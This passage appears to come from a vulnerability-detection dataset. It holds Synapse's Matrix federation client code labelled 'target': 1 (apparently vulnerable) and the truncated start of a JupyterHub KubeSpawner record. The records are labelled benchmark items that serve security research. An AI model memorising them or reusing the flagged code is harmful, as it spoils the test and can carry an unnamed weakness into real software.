itself!\")\n\n        # FIXME: This is only used by the tests. The actual json sent is\n        # generated by the json_data_callback.\n        json_data = transaction.get_dict()\n\n        path = _create_v1_path(\"/send/%s\", transaction.transaction_id)\n\n        response = await self.client.put_json(\n            transaction.destination,\n            path=path,\n            data=json_data,\n            json_data_callback=json_data_callback,\n            long_retries=True,\n            backoff_on_404=True,  # If we get a 404 the other side has gone\n            try_trailing_slash_on_400=True,\n        )\n\n        return response\n\n    @log_function\n    async def make_query(\n        self, destination, query_type, args, retry_on_dns_fail, ignore_backoff=False\n    ):\n        path = _create_v1_path(\"/query/%s\", query_type)\n\n        content = await self.client.get_json(\n            destination=destination,\n            path=path,\n            args=args,\n            retry_on_dns_fail=retry_on_dns_fail,\n            timeout=10000,\n            ignore_backoff=ignore_backoff,\n        )\n\n        return content\n\n    @log_function\n    async def make_membership_event(\n        self, destination, room_id, user_id, membership, params\n    ):\n        \"\"\"Asks a remote server to build and sign us a membership event\n\n        Note that this does not append any events to any graphs.\n\n        Args:\n            destination (str): address of remote homeserver\n            room_id (str): room to join/leave\n            user_id (str): user to be joined/left\n            membership (str): one of join/leave\n            params (dict[str, str|Iterable[str]]): Query parameters to include in the\n                request.\n\n        Returns:\n            Succeeds when we get a 2xx HTTP response. The result\n            will be the decoded JSON body (ie, the new event).\n\n            Fails with ``HTTPRequestException`` if we get an HTTP response\n            code >= 300.\n\n            Fails with ``NotRetryingDestination`` if we are not yet ready\n            to retry this server.\n\n            Fails with ``FederationDeniedError`` if the remote destination\n            is not in our federation whitelist\n        \"\"\"\n        valid_memberships = {Membership.JOIN, Membership.LEAVE}\n        if membership not in valid_memberships:\n            raise RuntimeError(\n                \"make_membership_event called with membership='%s', must be one of %s\"\n                % (membership, \",\".join(valid_memberships))\n            )\n        path = _create_v1_path(\"/make_%s/%s/%s\", membership, room_id, user_id)\n\n        ignore_backoff = False\n        retry_on_dns_fail = False\n\n        if membership == Membership.LEAVE:\n            # we particularly want to do our best to send leave events. The\n            # problem is that if it fails, we won't retry it later, so if the\n            # remote server was just having a momentary blip, the room will be\n            # out of sync.\n            ignore_backoff = True\n            retry_on_dns_fail = True\n\n        content = await self.client.get_json(\n            destination=destination,\n            path=path,\n            args=params,\n            retry_on_dns_fail=retry_on_dns_fail,\n            timeout=20000,\n            ignore_backoff=ignore_backoff,\n        )\n\n        return content\n\n    @log_function\n    async def send_join_v1(self, destination, room_id, event_id, content):\n        path = _create_v1_path(\"/send_join/%s/%s\", room_id, event_id)\n\n        response = await self.client.put_json(\n            destination=destination, path=path, data=content\n        )\n\n        return response\n\n    @log_function\n    async def send_join_v2(self, destination, room_id, event_id, content):\n        path = _create_v2_path(\"/send_join/%s/%s\", room_id, event_id)\n\n        response = await self.client.put_json(\n            destination=destination, path=path, data=content\n        )\n\n        return response\n\n    @log_function\n    async def send_leave_v1(self, destination, room_id, event_id, content):\n        path = _create_v1_path(\"/send_leave/%s/%s\", room_id, event_id)\n\n        response = await self.client.put_json(\n            destination=destination,\n            path=path,\n            data=content,\n            # we want to do our best to send this through. The problem is\n            # that if it fails, we won't retry it later, so if the remote\n            # server was just having a momentary blip, the room will be out of\n            # sync.\n            ignore_backoff=True,\n        )\n\n        return response\n\n    @log_function\n    async def send_leave_v2(self, destination, room_id, event_id, content):\n        path = _create_v2_path(\"/send_leave/%s/%s\", room_id, event_id)\n\n        response = await self.client.put_json(\n            destination=destination,\n            path=path,\n            data=content,\n            # we want to do our best to send this through. The problem is\n            # that if it fails, we won't retry it later, so if the remote\n            # server was just having a momentary blip, the room will be out of\n            # sync.\n            ignore_backoff=True,\n        )\n\n        return response\n\n    @log_function\n    async def send_invite_v1(self, destination, room_id, event_id, content):\n        path = _create_v1_path(\"/invite/%s/%s\", room_id, event_id)\n\n        response = await self.client.put_json(\n            destination=destination, path=path, data=content, ignore_backoff=True\n        )\n\n        return response\n\n    @log_function\n    async def send_invite_v2(self, destination, room_id, event_id, content):\n        path = _create_v2_path(\"/invite/%s/%s\", room_id, event_id)\n\n        response = await self.client.put_json(\n            destination=destination, path=path, data=content, ignore_backoff=True\n        )\n\n        return response\n\n    @log_function\n    async def get_public_rooms(\n        self,\n        remote_server: str,\n        limit: Optional[int] = None,\n        since_token: Optional[str] = None,\n        search_filter: Optional[Dict] = None,\n        include_all_networks: bool = False,\n        third_party_instance_id: Optional[str] = None,\n    ):\n        \"\"\"Get the list of public rooms from a remote homeserver\n\n        See synapse.federation.federation_client.FederationClient.get_public_rooms for\n        more information.\n        \"\"\"\n        if search_filter:\n            # this uses MSC2197 (Search Filtering over Federation)\n            path = _create_v1_path(\"/publicRooms\")\n\n            data = {\n                \"include_all_networks\": \"true\" if include_all_networks else \"false\"\n            }  # type: Dict[str, Any]\n            if third_party_instance_id:\n                data[\"third_party_instance_id\"] = third_party_instance_id\n            if limit:\n                data[\"limit\"] = str(limit)\n            if since_token:\n                data[\"since\"] = since_token\n\n            data[\"filter\"] = search_filter\n\n            try:\n                response = await self.client.post_json(\n                    destination=remote_server, path=path, data=data, ignore_backoff=True\n                )\n            except HttpResponseException as e:\n                if e.code == 403:\n                    raise SynapseError(\n                        403,\n                        \"You are not allowed to view the public rooms list of %s\"\n                        % (remote_server,),\n                        errcode=Codes.FORBIDDEN,\n                    )\n                raise\n        else:\n            path = _create_v1_path(\"/publicRooms\")\n\n            args = {\n                \"include_all_networks\": \"true\" if include_all_networks else \"false\"\n            }  # type: Dict[str, Any]\n            if third_party_instance_id:\n                args[\"third_party_instance_id\"] = (third_party_instance_id,)\n            if limit:\n                args[\"limit\"] = [str(limit)]\n            if since_token:\n                args[\"since\"] = [since_token]\n\n            try:\n                response = await self.client.get_json(\n                    destination=remote_server, path=path, args=args, ignore_backoff=True\n                )\n            except HttpResponseException as e:\n                if e.code == 403:\n                    raise SynapseError(\n                        403,\n                        \"You are not allowed to view the public rooms list of %s\"\n                        % (remote_server,),\n                        errcode=Codes.FORBIDDEN,\n                    )\n                raise\n\n        return response\n\n    @log_function\n    async def exchange_third_party_invite(self, destination, room_id, event_dict):\n        path = _create_v1_path(\"/exchange_third_party_invite/%s\", room_id)\n\n        response = await self.client.put_json(\n            destination=destination, path=path, data=event_dict\n        )\n\n        return response\n\n    @log_function\n    async def get_event_auth(self, destination, room_id, event_id):\n        path = _create_v1_path(\"/event_auth/%s/%s\", room_id, event_id)\n\n        content = await self.client.get_json(destination=destination, path=path)\n\n        return content\n\n    @log_function\n    async def query_client_keys(self, destination, query_content, timeout):\n        \"\"\"Query the device keys for a list of user ids hosted on a remote\n        server.\n\n        Request:\n            {\n              \"device_keys\": {\n                \"<user_id>\": [\"<device_id>\"]\n              }\n            }\n\n        Response:\n            {\n              \"device_keys\": {\n                \"<user_id>\": {\n                  \"<device_id>\": {...}\n                }\n              },\n              \"master_key\": {\n                \"<user_id>\": {...}\n                }\n              },\n              \"self_signing_key\": {\n                \"<user_id>\": {...}\n              }\n            }\n\n        Args:\n            destination(str): The server to query.\n            query_content(dict): The user ids to query.\n        Returns:\n            A dict containing device and cross-signing keys.\n        \"\"\"\n        path = _create_v1_path(\"/user/keys/query\")\n\n        content = await self.client.post_json(\n            destination=destination, path=path, data=query_content, timeout=timeout\n        )\n        return content\n\n    @log_function\n    async def query_user_devices(self, destination, user_id, timeout):\n        \"\"\"Query the devices for a user id hosted on a remote server.\n\n        Response:\n            {\n              \"stream_id\": \"...\",\n              \"devices\": [ { ... } ],\n              \"master_key\": {\n                \"user_id\": \"<user_id>\",\n                \"usage\": [...],\n                \"keys\": {...},\n                \"signatures\": {\n                  \"<user_id>\": {...}\n                }\n              },\n              \"self_signing_key\": {\n                \"user_id\": \"<user_id>\",\n                \"usage\": [...],\n                \"keys\": {...},\n                \"signatures\": {\n                  \"<user_id>\": {...}\n                }\n              }\n            }\n\n        Args:\n            destination(str): The server to query.\n            query_content(dict): The user ids to query.\n        Returns:\n            A dict containing device and cross-signing keys.\n        \"\"\"\n        path = _create_v1_path(\"/user/devices/%s\", user_id)\n\n        content = await self.client.get_json(\n            destination=destination, path=path, timeout=timeout\n        )\n        return content\n\n    @log_function\n    async def claim_client_keys(self, destination, query_content, timeout):\n        \"\"\"Claim one-time keys for a list of devices hosted on a remote server.\n\n        Request:\n            {\n              \"one_time_keys\": {\n                \"<user_id>\": {\n                  \"<device_id>\": \"<algorithm>\"\n                }\n              }\n            }\n\n        Response:\n            {\n              \"device_keys\": {\n                \"<user_id>\": {\n                  \"<device_id>\": {\n                    \"<algorithm>:<key_id>\": \"<key_base64>\"\n                  }\n                }\n              }\n            }\n\n        Args:\n            destination(str): The server to query.\n            query_content(dict): The user ids to query.\n        Returns:\n            A dict containing the one-time keys.\n        \"\"\"\n\n        path = _create_v1_path(\"/user/keys/claim\")\n\n        content = await self.client.post_json(\n            destination=destination, path=path, data=query_content, timeout=timeout\n        )\n        return content\n\n    @log_function\n    async def get_missing_events(\n        self,\n        destination,\n        room_id,\n        earliest_events,\n        latest_events,\n        limit,\n        min_depth,\n        timeout,\n    ):\n        path = _create_v1_path(\"/get_missing_events/%s\", room_id)\n\n        content = await self.client.post_json(\n            destination=destination,\n            path=path,\n            data={\n                \"limit\": int(limit),\n                \"min_depth\": int(min_depth),\n                \"earliest_events\": earliest_events,\n                \"latest_events\": latest_events,\n            },\n            timeout=timeout,\n        )\n\n        return content\n\n    @log_function\n    def get_group_profile(self, destination, group_id, requester_user_id):\n        \"\"\"Get a group profile\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/profile\", group_id)\n\n        return self.client.get_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def update_group_profile(self, destination, group_id, requester_user_id, content):\n        \"\"\"Update a remote group profile\n\n        Args:\n            destination (str)\n            group_id (str)\n            requester_user_id (str)\n            content (dict): The new profile of the group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/profile\", group_id)\n\n        return self.client.post_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            data=content,\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def get_group_summary(self, destination, group_id, requester_user_id):\n        \"\"\"Get a group summary\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/summary\", group_id)\n\n        return self.client.get_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def get_rooms_in_group(self, destination, group_id, requester_user_id):\n        \"\"\"Get all rooms in a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/rooms\", group_id)\n\n        return self.client.get_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    def add_room_to_group(\n        self, destination, group_id, requester_user_id, room_id, content\n    ):\n        \"\"\"Add a room to a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/room/%s\", group_id, room_id)\n\n        return self.client.post_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            data=content,\n            ignore_backoff=True,\n        )\n\n    def update_room_in_group(\n        self, destination, group_id, requester_user_id, room_id, config_key, content\n    ):\n        \"\"\"Update room in group\n        \"\"\"\n        path = _create_v1_path(\n            \"/groups/%s/room/%s/config/%s\", group_id, room_id, config_key\n        )\n\n        return self.client.post_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            data=content,\n            ignore_backoff=True,\n        )\n\n    def remove_room_from_group(self, destination, group_id, requester_user_id, room_id):\n        \"\"\"Remove a room from a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/room/%s\", group_id, room_id)\n\n        return self.client.delete_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def get_users_in_group(self, destination, group_id, requester_user_id):\n        \"\"\"Get users in a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/users\", group_id)\n\n        return self.client.get_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def get_invited_users_in_group(self, destination, group_id, requester_user_id):\n        \"\"\"Get users that have been invited to a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/invited_users\", group_id)\n\n        return self.client.get_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def accept_group_invite(self, destination, group_id, user_id, content):\n        \"\"\"Accept a group invite\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/users/%s/accept_invite\", group_id, user_id)\n\n        return self.client.post_json(\n            destination=destination, path=path, data=content, ignore_backoff=True\n        )\n\n    @log_function\n    def join_group(self, destination, group_id, user_id, content):\n        \"\"\"Attempts to join a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/users/%s/join\", group_id, user_id)\n\n        return self.client.post_json(\n            destination=destination, path=path, data=content, ignore_backoff=True\n        )\n\n    @log_function\n    def invite_to_group(\n        self, destination, group_id, user_id, requester_user_id, content\n    ):\n        \"\"\"Invite a user to a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/users/%s/invite\", group_id, user_id)\n\n        return self.client.post_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            data=content,\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def invite_to_group_notification(self, destination, group_id, user_id, content):\n        \"\"\"Sent by group server to inform a user's server that they have been\n        invited.\n        \"\"\"\n\n        path = _create_v1_path(\"/groups/local/%s/users/%s/invite\", group_id, user_id)\n\n        return self.client.post_json(\n            destination=destination, path=path, data=content, ignore_backoff=True\n        )\n\n    @log_function\n    def remove_user_from_group(\n        self, destination, group_id, requester_user_id, user_id, content\n    ):\n        \"\"\"Remove a user from a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/users/%s/remove\", group_id, user_id)\n\n        return self.client.post_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            data=content,\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def remove_user_from_group_notification(\n        self, destination, group_id, user_id, content\n    ):\n        \"\"\"Sent by group server to inform a user's server that they have been\n        kicked from the group.\n        \"\"\"\n\n        path = _create_v1_path(\"/groups/local/%s/users/%s/remove\", group_id, user_id)\n\n        return self.client.post_json(\n            destination=destination, path=path, data=content, ignore_backoff=True\n        )\n\n    @log_function\n    def renew_group_attestation(self, destination, group_id, user_id, content):\n        \"\"\"Sent by either a group server or a user's server to periodically update\n        the attestations\n        \"\"\"\n\n        path = _create_v1_path(\"/groups/%s/renew_attestation/%s\", group_id, user_id)\n\n        return self.client.post_json(\n            destination=destination, path=path, data=content, ignore_backoff=True\n        )\n\n    @log_function\n    def update_group_summary_room(\n        self, destination, group_id, user_id, room_id, category_id, content\n    ):\n        \"\"\"Update a room entry in a group summary\n        \"\"\"\n        if category_id:\n            path = _create_v1_path(\n                \"/groups/%s/summary/categories/%s/rooms/%s\",\n                group_id,\n                category_id,\n                room_id,\n            )\n        else:\n            path = _create_v1_path(\"/groups/%s/summary/rooms/%s\", group_id, room_id)\n\n        return self.client.post_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": user_id},\n            data=content,\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def delete_group_summary_room(\n        self, destination, group_id, user_id, room_id, category_id\n    ):\n        \"\"\"Delete a room entry in a group summary\n        \"\"\"\n        if category_id:\n            path = _create_v1_path(\n                \"/groups/%s/summary/categories/%s/rooms/%s\",\n                group_id,\n                category_id,\n                room_id,\n            )\n        else:\n            path = _create_v1_path(\"/groups/%s/summary/rooms/%s\", group_id, room_id)\n\n        return self.client.delete_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def get_group_categories(self, destination, group_id, requester_user_id):\n        \"\"\"Get all categories in a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/categories\", group_id)\n\n        return self.client.get_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def get_group_category(self, destination, group_id, requester_user_id, category_id):\n        \"\"\"Get category info in a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/categories/%s\", group_id, category_id)\n\n        return self.client.get_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def update_group_category(\n        self, destination, group_id, requester_user_id, category_id, content\n    ):\n        \"\"\"Update a category in a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/categories/%s\", group_id, category_id)\n\n        return self.client.post_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            data=content,\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def delete_group_category(\n        self, destination, group_id, requester_user_id, category_id\n    ):\n        \"\"\"Delete a category in a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/categories/%s\", group_id, category_id)\n\n        return self.client.delete_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def get_group_roles(self, destination, group_id, requester_user_id):\n        \"\"\"Get all roles in a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/roles\", group_id)\n\n        return self.client.get_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def get_group_role(self, destination, group_id, requester_user_id, role_id):\n        \"\"\"Get a roles info\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/roles/%s\", group_id, role_id)\n\n        return self.client.get_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def update_group_role(\n        self, destination, group_id, requester_user_id, role_id, content\n    ):\n        \"\"\"Update a role in a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/roles/%s\", group_id, role_id)\n\n        return self.client.post_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            data=content,\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def delete_group_role(self, destination, group_id, requester_user_id, role_id):\n        \"\"\"Delete a role in a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/roles/%s\", group_id, role_id)\n\n        return self.client.delete_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def update_group_summary_user(\n        self, destination, group_id, requester_user_id, user_id, role_id, content\n    ):\n        \"\"\"Update a users entry in a group\n        \"\"\"\n        if role_id:\n            path = _create_v1_path(\n                \"/groups/%s/summary/roles/%s/users/%s\", group_id, role_id, user_id\n            )\n        else:\n            path = _create_v1_path(\"/groups/%s/summary/users/%s\", group_id, user_id)\n\n        return self.client.post_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            data=content,\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def set_group_join_policy(self, destination, group_id, requester_user_id, content):\n        \"\"\"Sets the join policy for a group\n        \"\"\"\n        path = _create_v1_path(\"/groups/%s/settings/m.join_policy\", group_id)\n\n        return self.client.put_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            data=content,\n            ignore_backoff=True,\n        )\n\n    @log_function\n    def delete_group_summary_user(\n        self, destination, group_id, requester_user_id, user_id, role_id\n    ):\n        \"\"\"Delete a users entry in a group\n        \"\"\"\n        if role_id:\n            path = _create_v1_path(\n                \"/groups/%s/summary/roles/%s/users/%s\", group_id, role_id, user_id\n            )\n        else:\n            path = _create_v1_path(\"/groups/%s/summary/users/%s\", group_id, user_id)\n\n        return self.client.delete_json(\n            destination=destination,\n            path=path,\n            args={\"requester_user_id\": requester_user_id},\n            ignore_backoff=True,\n        )\n\n    def bulk_get_publicised_groups(self, destination, user_ids):\n        \"\"\"Get the groups a list of users are publicising\n        \"\"\"\n\n        path = _create_v1_path(\"/get_groups_publicised\")\n\n        content = {\"user_ids\": user_ids}\n\n        return self.client.post_json(\n            destination=destination, path=path, data=content, ignore_backoff=True\n        )\n\n    def get_room_complexity(self, destination, room_id):\n        \"\"\"\n        Args:\n            destination (str): The remote server\n            room_id (str): The room ID to ask about.\n        \"\"\"\n        path = _create_path(FEDERATION_UNSTABLE_PREFIX, \"/rooms/%s/complexity\", room_id)\n\n        return self.client.get_json(destination=destination, path=path)\n\n\ndef _create_path(federation_prefix, path, *args):\n    \"\"\"\n    Ensures that all args are url encoded.\n    \"\"\"\n    return federation_prefix + path % tuple(urllib.parse.quote(arg, \"\") for arg in args)\n\n\ndef _create_v1_path(path, *args):\n    \"\"\"Creates a path against V1 federation API from the path template and\n    args. Ensures that all args are url encoded.\n\n    Example:\n\n        _create_v1_path(\"/event/%s\", event_id)\n\n    Args:\n        path (str): String template for the path\n        args: ([str]): Args to insert into path. Each arg will be url encoded\n\n    Returns:\n        str\n    \"\"\"\n    return _create_path(FEDERATION_V1_PREFIX, path, *args)\n\n\ndef _create_v2_path(path, *args):\n    \"\"\"Creates a path against V2 federation API from the path template and\n    args. Ensures that all args are url encoded.\n\n    Example:\n\n        _create_v2_path(\"/event/%s\", event_id)\n\n    Args:\n        path (str): String template for the path\n        args: ([str]): Args to insert into path. Each arg will be url encoded\n\n    Returns:\n        str\n    \"\"\"\n    return _create_path(FEDERATION_V2_PREFIX, path, *args)\n", "target": 1}
{"idx": 1075, "func": "\"\"\"\nJupyterHub Spawner to spawn user notebooks on a Kubernetes cluster.\n\nThis module exports `KubeSpawner` class, which is the actual spawner\nimplementation that should be used by JupyterHub.\n\"\"\"\n\nfrom functools import partial  # noqa\nfrom datetime import datetime\nimport json\nimport os\nimport sys\nimport string\nimport multiprocessing\nfrom concurrent.futures import ThreadPoolExecutor\nimport warnings\n\nfrom tornado import gen\nfrom tornado.ioloop import IOLoop\nfrom tornado.concurrent import run_on_executor\nfrom tornado import web\nfrom traitlets import (\n    Bool,\n    Dict,\n    Integer,\n    List,\n    Unicode,\n    Union,\n    default,\n    observe,\n    validate,\n)\nfrom jupyterhub.spawner import Spawner\nfrom jupyterhub.utils import exponential_backoff\nfrom jupyterhub.traitlets import Command\nfrom kubernetes.client.rest import ApiException\nfrom kubernetes import client\nimport escapism\nfrom jinja2 import Environment, BaseLoader\n\nfrom .clients import shared_client\nfrom kubespawner.traitlets import Callable\nfrom kubespawner.objects import make_pod, make_pvc\nfrom kubespawner.reflector import NamespacedResourceReflector\nfrom asyncio import sleep\nfrom async_generator import async_generator, yield_\nfrom slugify import slugify\n\nclass PodReflector(NamespacedResourceReflector):\n    \"\"\"\n    PodReflector is merely a configured NamespacedResourceReflector. It exposes\n    the pods property, which is simply mapping to self.resources where the\n    NamespacedResourceReflector keeps an updated list of the resource defined by\n    the `kind` field and the `list_method_name` field.\n    \"\"\"\n    kind = 'pods'\n    list_method_name = 'list_namespaced_pod'\n    # FUTURE: These labels are the selection labels for the PodReflector. We\n    # might want to support multiple deployments in the same namespace, so we\n    # would need to select based on additional labels such as `app` and\n    # `release`.\n    labels = {\n        'component': 'singleuser-server',\n    }\n\n    @property\n    def pods(self):\n        \"\"\"\n        A dictionary of the python kubernetes client's representation of pods\n        for the namespace. The dictionary keys are the pod ids and the values\n        are the actual pod resource representations.\n\n        ref: https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.16/#pod-v1-core\n        \"\"\"\n        return self.resources\n\n\nclass EventReflector(NamespacedResourceReflector):\n    \"\"\"\n    EventsReflector is merely a configured NamespacedResourceReflector. It\n    exposes the events property, which is simply mapping to self.resources where\n    the NamespacedResourceReflector keeps an updated list of the resource\n    defined by the `kind` field and the `list_method_name` field.\n    \"\"\"\n    kind = 'events'\n    list_method_name = 'list_namespaced_event'\n\n    @property\n    def events(self):\n        \"\"\"\n        Returns list of the python kubernetes client's representation of k8s\n        events within the namespace, sorted by the latest event.\n\n        ref: https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.16/#event-v1-core\n        \"\"\"\n\n        # NOTE:\n        # - self.resources is a dictionary with keys mapping unique ids of\n        #   Kubernetes Event resources, updated by NamespacedResourceReflector.\n        #   self.resources will builds up with incoming k8s events, but can also\n        #   suddenly refreshes itself entirely. We should not assume a call to\n        #   this dictionary's values will result in a consistently ordered list,\n        #   so we sort it to get it somewhat more structured.\n        # - We either seem to get only event.last_timestamp or event.event_time,\n        #   both fields serve the same role but the former is a low resolution\n        #   timestamp without and the other is a higher resolution timestamp.\n        return sorted(\n            self.resources.values(),\n            key=lambda event: event.last_timestamp or event.event_time,\n        )\n\n\nclass MockObject(object):\n    pass\n\nclass KubeSpawner(Spawner):\n    \"\"\"\n    A JupyterHub spawner that spawn pods in a Kubernetes Cluster. Each server\n    spawned by a user will have its own KubeSpawner instance.\n    \"\"\"\n\n    # We want to have one single threadpool executor that is shared across all\n    # KubeSpawner instances, so we apply a Singleton pattern. We initialize this\n    # class variable from the first KubeSpawner instance that is created and\n    # then reference it from all instances. The same goes for the PodReflector\n    # and EventReflector.\n    executor = None\n    reflectors = {\n        \"pods\": None,\n        \"events\": None,\n    }\n\n    @property\n    def pod_reflector(self):\n        \"\"\"\n        A convinience alias to the class variable reflectors['pods'].\n        \"\"\"\n        return self.__class__.reflectors['pods']\n\n    @property\n    def event_reflector(self):\n        \"\"\"\n        A convninience alias to the class variable reflectors['events'] if the\n        spawner instance has events_enabled.\n        \"\"\"\n        if self.events_enabled:\n            return self.__class__.reflectors['events']\n\n    def __init__(self, *args, **kwargs):\n        _mock = kwargs.pop('_mock', False)\n        super().__init__(*args, **kwargs)\n\n        if _mock:\n            # runs during test execution only\n            if 'user' not in kwargs:\n                user = MockObject()\n                user.name = 'mock_name'\n                user.id = 'mock_id'\n                user.url = 'mock_url'\n                self.user = user\n\n            if 'hub' not in kwargs:\n                hub = MockObject()\n                hub.public_host = 'mock_public_host'\n                hub.url = 'mock_url'\n                hub.base_url = 'mock_base_url'\n                hub.api_url = 'mock_api_url'\n                self.hub = hub\n        else:\n            # runs during normal execution only\n\n            # By now, all the traitlets have been set, so we can use them to compute\n            # other attributes\n            if self.__class__.executor is None:\n                self.__class__.executor = ThreadPoolExecutor(\n                    max_workers=self.k8s_api_threadpool_workers\n                )\n\n            # This will start watching in __init__, so it'll start the first\n            # time any spawner object is created. Not ideal but works!\n            self._start_watching_pods()\n            if self.events_enabled:\n                self._start_watching_events()\n\n            self.api = shared_client('CoreV1Api')\n\n        # runs during both test and normal execution\n        self.pod_name = self._expand_user_properties(self.pod_name_template)\n        self.pvc_name = self._expand_user_properties(self.pvc_name_template)\n        if self.working_dir:\n            self.working_dir = self._expand_user_properties(self.working_dir)\n        if self.port == 0:\n            # Our default port is 8888\n            self.port = 8888\n\n    k8s_api_threadpool_workers = Integer(\n        # Set this explicitly, since this is the default in Python 3.5+\n        # but not in 3.4\n        5 * multiprocessing.cpu_count(),\n        config=True,\n        help=\"\"\"\n        Number of threads in thread pool used to talk to the k8s API.\n\n        Increase this if you are dealing with a very large number of users.\n\n        Defaults to `5 * cpu_cores`, which is the default for `ThreadPoolExecutor`.\n        \"\"\"\n    )\n\n    events_enabled = Bool(\n        True,\n        config=True,\n        help=\"\"\"\n        Enable event-watching for progress-reports to the user spawn page.\n\n        Disable if these events are not desirable\n        or to save some performance cost.\n        \"\"\"\n    )\n\n    namespace = Unicode(\n        config=True,\n        help=\"\"\"\n        Kubernetes namespace to spawn user pods in.\n\n        If running inside a kubernetes cluster with service accounts enabled,\n        defaults to the current namespace. If not, defaults to `default`\n        \"\"\"\n    )\n\n    @default('namespace')\n    def _namespace_default(self):\n        \"\"\"\n        Set namespace default to current namespace if running in a k8s cluster\n\n        If not in a k8s cluster with service accounts enabled, default to\n        `default`\n        \"\"\"\n        ns_path = '/var/run/secrets/kubernetes.io/serviceaccount/namespace'\n        if os.path.exists(ns_path):\n            with open(ns_path) as f:\n                return f.read().strip()\n        return 'default'\n\n    ip = Unicode(\n        '0.0.0.0',\n        config=True,\n        help=\"\"\"\n        The IP address (or hostname) the single-user server should listen on.\n\n        We override this from the parent so we can set a more sane default for\n        the Kubernetes setup.\n        \"\"\"\n    )\n\n    cmd = Command(\n        None,\n        allow_none=True,\n        minlen=0,\n        config=True,\n        help=\"\"\"\n        The command used for starting the single-user server.\n\n        Provide either a string or a list containing the path to the startup script command. Extra arguments,\n        other than this path, should be provided via `args`.\n\n        This is usually set if you want to start the single-user server in a different python\n        environment (with virtualenv/conda) than JupyterHub itself.\n\n        Some spawners allow shell-style expansion here, allowing you to use environment variables.\n        Most, including the default, do not. Consult the documentation for your spawner to verify!\n\n        If set to `None`, Kubernetes will start the `CMD` that is specified in the Docker image being started.\n        \"\"\"\n    )\n\n    # FIXME: Don't override 'default_value' (\"\") or 'allow_none' (False) (Breaking change)\n    working_dir = Unicode(\n        None,\n        allow_none=True,\n        config=True,\n        help=\"\"\"\n        The working directory where the Notebook server will be started inside the container.\n        Defaults to `None` so the working directory will be the one defined in the Dockerfile.\n\n        `{username}` is expanded to the escaped, dns-label safe username.\n        \"\"\"\n    )\n\n    # FIXME: Don't override 'default_value' (\"\") or 'allow_none' (False) (Breaking change)\n    service_account = Unicode(\n        None,\n        allow_none=True,\n        config=True,\n        help=\"\"\"\n        The service account to be mounted in the spawned user pod.\n\n        When set to `None` (the default), no service account is mounted, and the default service account\n        is explicitly disabled.\n\n        This `serviceaccount` must already exist in the namespace the user pod is being spawned in.\n\n        WARNING: Be careful with this configuration! Make sure the service account being mounted\n        has the minimal permissions 